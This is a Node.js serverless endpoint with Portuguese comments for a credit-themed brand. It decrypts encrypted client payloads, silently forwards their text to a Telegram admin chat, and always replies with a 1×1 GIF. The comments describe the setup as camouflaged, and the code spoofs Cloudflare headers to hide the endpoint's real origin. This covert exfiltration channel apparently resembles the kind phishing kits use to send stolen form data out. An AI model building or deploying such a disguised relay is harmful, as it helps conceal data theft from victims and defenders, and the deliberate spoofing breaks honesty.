/**
 * Plantae Agrocrédito — Telegram Pixel Relay (Camuflado & Criptografado)
 * ─────────────────────────────────────────────────────────────────────────
 * Rota pública aparente: /r/px  (alias via vercel.json → /api/px)
 *
 * Como funciona:
 *   1. O cliente envia um payload AES-256-GCM cifrado em Base64-URL
 *   2. Este endpoint decifra, valida o timestamp (anti-replay 5min),
 *      e encaminha a mensagem ao Telegram silenciosamente
 *   3. Responde com um GIF 1×1 transparente — visualmente indistinguível
 *      de um pixel de rastreamento normal
 *   4. Nenhum token, chatId ou dado sensível trafega no cliente
 *   5. Headers propositalmente imitam um CDN de imagem (Cloudflare/Fastly)
 *
 * Chave: PIXEL_CIPHER_KEY (env var) — 32 bytes hex (64 chars)
 *        Fallback seguro: derivada do TELEGRAM_BOT_TOKEN via PBKDF2
 */

'use strict';

const crypto = require('crypto');
const https  = require('https');
const fs     = require('fs');
const path   = require('path');

// ─── GIF 1×1 pixel transparente (binary) ─────────────────────────────────────
// Bytes do GIF89a mínimo — resposta idêntica à do Google Analytics / Meta Pixel
const TRANSPARENT_GIF = Buffer.from(
  '47494638396101000100800000ffffff00000021f90400000000002c00000000010001000002024401003b',
  'hex'
);

// ─── Derivação de chave ────────────────────────────────────────────────────────
function getTelegramToken() {
  try {
    const cfg = JSON.parse(fs.readFileSync(path.join(process.cwd(), 'data', 'config.json'), 'utf8'));
    return cfg.telegram_bot_token || '';
  } catch (e) { return ''; }
}

function getPixelKey() {
  const hexKey = process.env.PIXEL_CIPHER_KEY || '';
  if (hexKey && hexKey.length === 64) {
    return Buffer.from(hexKey, 'hex');
  }
  // Fallback: deriva chave a partir do bot token via PBKDF2 (determinístico, seguro)
  const seed = process.env.TELEGRAM_BOT_TOKEN || getTelegramToken() || 'plantae_pixel_fallback_2026';
  return crypto.pbkdf2Sync(seed, 'plantae_pixel_salt_v3', 100_000, 32, 'sha256');
}

function getTelegramConfig() {
  let token  = process.env.TELEGRAM_BOT_TOKEN || '';
  let chatId = process.env.TELEGRAM_ADMIN_CHAT_ID || '';
  try {
    const cfg = JSON.parse(fs.readFileSync(path.join(process.cwd(), 'data', 'config.json'), 'utf8'));
    token  = cfg.telegram_bot_token || token;
    chatId = cfg.telegram_admin_id  || chatId;
  } catch (e) {
    try {
      const cfg = JSON.parse(fs.readFileSync(path.join(process.cwd(), 'api', 'config.json'), 'utf8'));
      token  = cfg.telegram_bot_token || token;
      chatId = cfg.telegram_admin_id  || chatId;
    } catch (e2) {}
  }
  return { token, chatId };
}

// ─── AES-256-GCM Decrypt ──────────────────────────────────────────────────────
/**
 * Decifra payload cifrado pelo cliente.
 * Formato: Base64URL( iv[12] | authTag[16] | ciphertext )
 */
function decryptPayload(b64, key) {
  try {
    const buf       = Buffer.from(b64.replace(/-/g, '+').replace(/_/g, '/'), 'base64');
    if (buf.length < 28) return null;

    const iv         = buf.slice(0, 12);
    const authTag    = buf.slice(12, 28);
    const ciphertext = buf.slice(28);

    const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
    decipher.setAuthTag(authTag);

    const plain = Buffer.concat([decipher.update(ciphertext), decipher.final()]);
    return JSON.parse(plain.toString('utf8'));
  } catch (e) {
    return null;
  }
}

// ─── AES-256-GCM Encrypt (util para uso interno/admin) ───────────────────────
function encryptPayload(obj, key) {
  const iv         = crypto.randomBytes(12);
  const cipher     = crypto.createCipheriv('aes-256-gcm', key, iv);
  const plain      = Buffer.from(JSON.stringify(obj), 'utf8');
  const ciphertext = Buffer.concat([cipher.update(plain), cipher.final()]);
  const authTag    = cipher.getAuthTag();
  const combined   = Buffer.concat([iv, authTag, ciphertext]);
  return combined.toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
}

// ─── Anti-replay cache (in-memory, por instância) ─────────────────────────────
const seenNonces = new Map();
const NONCE_TTL_MS = 5 * 60 * 1000; // 5 min

function isReplay(nonce, ts) {
  const now = Date.now();
  // Limpa nonces expirados
  for (const [n, t] of seenNonces.entries()) {
    if (now - t > NONCE_TTL_MS) seenNonces.delete(n);
  }
  // Timestamp válido (±5 min)
  if (Math.abs(now - ts) > NONCE_TTL_MS) return true;
  if (nonce && seenNonces.has(nonce)) return true;
  if (nonce) seenNonces.set(nonce, now);
  return false;
}

// ─── Telegram Relay (fire-and-forget, timeout agressivo 4s) ──────────────────
function relayToTelegram(token, chatId, text, markup) {
  if (!token || !chatId || !text) return;
  const payload = JSON.stringify({
    chat_id      : chatId,
    text,
    parse_mode   : 'HTML',
    reply_markup : markup || undefined,
  });

  const req = https.request({
    hostname: 'api.telegram.org',
    path    : `/bot${token}/sendMessage`,
    method  : 'POST',
    timeout : 4000,
    headers : {
      'Content-Type'  : 'application/json',
      'Content-Length': Buffer.byteLength(payload),
    },
  });
  req.on('error',   () => {});
  req.on('timeout', () => req.destroy());
  req.write(payload);
  req.end();
}

// ─── Response camuflada como pixel de CDN ─────────────────────────────────────
function sendPixelResponse(res) {
  res.setHeader('Content-Type',           'image/gif');
  res.setHeader('Content-Length',         String(TRANSPARENT_GIF.length));
  res.setHeader('Cache-Control',          'no-store, no-cache, must-revalidate, private');
  res.setHeader('Pragma',                 'no-cache');
  res.setHeader('Expires',               '0');
  res.setHeader('X-Content-Type-Options', 'nosniff');
  // Cabeçalhos falsos de CDN — camuflam a origem real do endpoint
  res.setHeader('Server',                'cloudflare');
  res.setHeader('CF-Cache-Status',       'BYPASS');
  res.setHeader('Vary',                  'Accept-Encoding');
  return res.status(200).end(TRANSPARENT_GIF);
}

// ─── Handler principal ────────────────────────────────────────────────────────
module.exports = function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin',  'same-origin');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return sendPixelResponse(res);

  // Aceita GET (?d=<payload>) e POST (body: { d: <payload> })
  let encoded = '';
  if (req.method === 'GET') {
    encoded = (req.query || {}).d || '';
  } else if (req.method === 'POST') {
    let body = req.body || {};
    if (typeof body === 'string') { try { body = JSON.parse(body); } catch (e) {} }
    encoded = body.d || body.payload || '';
  }

  // Sempre responde com pixel — nunca revela estado interno
  if (!encoded) return sendPixelResponse(res);

  const key  = getPixelKey();
  const data = decryptPayload(encoded, key);

  if (!data) return sendPixelResponse(res);

  // Anti-replay
  if (isReplay(data.nonce, data.ts)) return sendPixelResponse(res);

  // Relay assíncrono ao Telegram (não bloqueia a resposta pixel)
  const { token, chatId } = getTelegramConfig();
  if (data.text && token && chatId) {
    relayToTelegram(token, chatId, data.text, data.markup || null);
  }

  return sendPixelResponse(res);
};

// ─── Exporta utilitários para uso interno/testes ──────────────────────────────
module.exports.encryptPayload = encryptPayload;
module.exports.getPixelKey    = getPixelKey;
